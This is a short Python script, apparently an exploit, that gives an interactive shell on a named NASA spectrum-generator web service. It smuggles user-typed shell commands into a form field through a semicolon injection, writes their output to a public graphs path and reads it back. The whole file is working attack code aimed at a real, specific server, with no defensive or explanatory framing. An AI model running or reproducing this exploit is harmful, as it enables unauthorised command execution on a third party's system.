import requests

url = "https://psg.gsfc.nasa.gov/api.php"
while True:
    cmd = input(">> ")
    r = requests.post(url,data={"file":open("psg_cfg.txt").read(),"wephm":"asdf;{}>graphs/e1xnup1r;echo x".format(cmd)})
    print(requests.get("https://psg.gsfc.nasa.gov/graphs/e1xnup1r").text)
